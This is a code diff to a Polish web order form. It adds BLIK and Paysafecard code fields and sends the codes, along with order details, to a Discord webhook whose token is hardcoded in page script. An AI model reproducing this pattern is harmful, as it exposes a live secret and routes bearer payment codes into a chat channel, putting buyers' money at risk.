@@ -121,11 +121,21 @@
             <input type="text" id="discordName" placeholder="Twoje imię na Discord" required>
             
             <!-- Wybór metody płatności -->
-            <select id="paymentMethod" required>
+            <select id="paymentMethod" onchange="showPaymentFields()" required>
                 <option value="" disabled selected>Wybierz metodę płatności</option>
                 <option value="Blik">Blik</option>
                 <option value="Paysafecard">Paysafecard</option>
             </select>
+
+            <!-- Sekcja płatności -->
+            <div class="payment-section" id="paymentFields">
+                <div id="blikFields" style="display: none;">
+                    <input type="text" id="blikCode" placeholder="Kod BLIK" required>
+                </div>
+                <div id="paysafecardFields" style="display: none;">
+                    <input type="text" id="paysafecardCode" placeholder="Kod Paysafecard" required>
+                </div>
+            </div>
             
             <button onclick="sendOrder()">Zamów</button>
         </div>
@@ -144,6 +154,17 @@
             }
         }
 
+        function showPaymentFields() {
+            const paymentMethod = document.getElementById("paymentMethod").value;
+            const paymentFields = document.getElementById("paymentFields");
+            const blikFields = document.getElementById("blikFields");
+            const paysafecardFields = document.getElementById("paysafecardFields");
+
+            paymentFields.style.display = "block";
+            blikFields.style.display = paymentMethod === "Blik" ? "block" : "none";
+            paysafecardFields.style.display = paymentMethod === "Paysafecard" ? "block" : "none";
+        }
+
         function sendOrder() {
             const productSelect = document.getElementById("product");
             const product = productSelect.options[productSelect.selectedIndex].text;
@@ -152,13 +173,23 @@
             const paymentMethod = document.getElementById("paymentMethod").value;
             const totalPrice = document.getElementById("totalPrice").textContent.replace("Kwota: ", "").replace(" PLN", "");
 
-            if (!product || !quantity || !discordName || !paymentMethod) {
+            // W zależności od metody płatności, pobierz odpowiednie dane
+            let paymentDetails = "";
+            if (paymentMethod === "Blik") {
+                const blikCode = document.getElementById("blikCode").value;
+                paymentDetails = `Kod BLIK: ${blikCode}`;
+            } else if (paymentMethod === "Paysafecard") {
+                const paysafecardCode = document.getElementById("paysafecardCode").value;
+                paymentDetails = `Kod Paysafecard: ${paysafecardCode}`;
+            }
+
+            if (!product || !quantity || !discordName || !paymentMethod || (paymentMethod === "Blik" && !paymentDetails) || (paymentMethod === "Paysafecard" && !paymentDetails)) {
                 alert("Wszystkie pola są wymagane!");
                 return;
             }
 
             const data = {
-                content: ` Zamówienie:\n**Produkt**: ${product}\n**Ilość**: ${quantity}\n**Discord**: ${discordName}\n**Metoda płatności**: ${paymentMethod}\n**Kwota**: ${totalPrice} PLN`
+                content: `Nowe zamówienie:\n**Produkt**: ${product}\n**Ilość**: ${quantity}\n**Discord**: ${discordName}\n**Metoda płatności**: ${paymentMethod}\n**Kwota**: ${totalPrice} PLN\n**Szczegóły płatności**: ${paymentDetails}`
             };
 
             fetch("https://discord.com/api/webhooks/1299247551517823027/PZyl_eAQ0JF-oHwlVvlOIzfCrLfiemKhctntNAor1CJ2HIwkjesMxPUV6WRSv6Q48v68", {
@@ -174,6 +205,7 @@
                     document.getElementById("discordName").value = "";
                     document.getElementById("paymentMethod").value = "";
                     document.getElementById("totalPrice").textContent = "Kwota: 0 PLN";
+                    document.getElementById("paymentFields").style.display = "none";
                 } else {
                     alert("Wystąpił błąd przy wysyłaniu zamówienia.");
                 }
